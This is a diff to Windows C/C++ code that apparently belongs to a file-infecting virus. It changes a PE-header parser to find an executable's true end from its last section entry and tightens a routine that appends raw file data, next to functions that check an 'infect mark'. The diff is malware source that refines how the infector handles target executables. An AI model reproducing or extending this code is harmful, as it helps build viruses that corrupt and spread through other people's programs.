@@ -1,4 +1,3 @@
-#include <iostream>
 #include <windows.h>
 #include <stdio.h> 
 #include <stdlib.h>
@@ -11,13 +10,20 @@ __int64  getSizeOfFile(TCHAR* filename){
 			     NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
 	HANDLE fmapHandle=CreateFileMapping(fHandle,NULL,PAGE_EXECUTE_READ,0,0,NULL);
 	LPVOID fAddress=MapViewOfFile(fmapHandle,FILE_MAP_READ,0,0,0);
+	
+	unsigned short numOfSection=*(unsigned short*)(fAddress+*(short* )(fAddress+0x3c)+0x06);
+	long long p=(long long)(fAddress+*(short* )(fAddress+0x3c)+0xf8);
+	p+=( (numOfSection-1)*0x28 +0x10);
+	
+	unsigned int sizeOfRawData = *(unsigned int*)p;
+	unsigned int pointToRawData = *(unsigned int*)(p+0x04);
 
-	unsigned int sizeOfImage=*(unsigned int*)(fAddress+*(short* )(fAddress+0x3c)+0x50);
 	
 	UnmapViewOfFile(fAddress);
 	CloseHandle(fmapHandle);
 	CloseHandle(fHandle);
-	return sizeOfImage;
+	
+	return sizeOfRawData+pointToRawData;
 }
 
 bool checkInfectMark(TCHAR* origfullPath){
@@ -54,6 +60,7 @@ void putRawFile(FILE* f_append,char* rawFile,int sizeOfImage){
     			rch-=(rch_sum-sizeOfImage);
 			}
         	fwrite(buffer,sizeof(char),rch,f_append);
+        	if(rch_sum>=sizeOfImage)break;
    		}
    		fclose(f_rawimage);
 }
